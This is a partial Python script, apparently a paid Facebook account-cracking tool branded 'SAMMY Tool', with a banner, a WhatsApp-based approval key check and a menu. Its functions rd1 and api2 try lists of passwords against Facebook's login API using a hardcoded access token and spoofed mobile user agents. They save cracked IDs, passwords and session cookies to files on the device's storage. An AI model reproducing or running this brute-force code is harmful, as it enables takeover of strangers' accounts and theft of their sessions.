...
try:
	...
	os.system('python SAMMY_enc.py')

print('\x1b[1;92m[•] Wellcome To SAMMY Tool')
...
logo=("""\
   ...
   \033[92;1m.....%%..%%..%%..%%...%%..%%...%%....%%...
   ..%%%%...%%..%%..%%...%%..%%...%%....%%...
   \033[97;1m..........................................\033[92;1m XD
\033[1;37m================================================
\033[1;32m Owner   :            SAMMY JUTA
\033[1;32m Facebook:            JOSHUA NWALI
\033[1;32m Github  :            Sammyjuta
...
def pp():
	...
	try:
			li = ['https://github.com/Sammyjuta/Sammyjuta/blob/main/Approval.txt']
			li = ''.join(li)
			...
			if ky in ck:
				...
				os.system('xdg-open https://wa.me/+923450877570?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*SAMMY*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
...
def menu():
		...
		#	os.system('xdg-open)
			if xd in ['1','01']:
				...
				os.system('xdg-open https://api.whatsapp.com/send?phone=+2349157628218&text=')
				menu()
			elif xd in ['0','00']:
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [SAMMY-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/67.0.0.4339;FBBV/7684233;[FBAN/FB4A;FBAV/18.0.0.19.61;FBBV/9364691;FBDM/{density=2.75,width=720,height=1280};FBLC/ar_LB;FBRV/590698522;FBCR/Orange Polska;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:armeabi;;]"
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [SAMMY-OK] '+uid+' â '+pas)
                        open('/sdcard/SAMMY-R-OK.txt','a').write(uid+'|'+pas+'\n')
                        open('/sdcard/SAMMY-R-COKI-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                        uid = str(po['error']['error_data']['uid'])
                        print(f'\r\r\x1b[38;5;205m [SAMMY-CP] '+uid+' | '+pas+'\033[1;97m')
                        open('/sdcard/SAMMY-R-CP.txt','a').write(uid+'|'+pas+'\n')
                        break
                else:
                    continue
        loop+=1
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SAMMY-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SAMMY-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SAMMY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SAMMY-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SAMMY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAMMY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SAMMY-CP.txt','a').write(ids+'|'+pas+'\n')
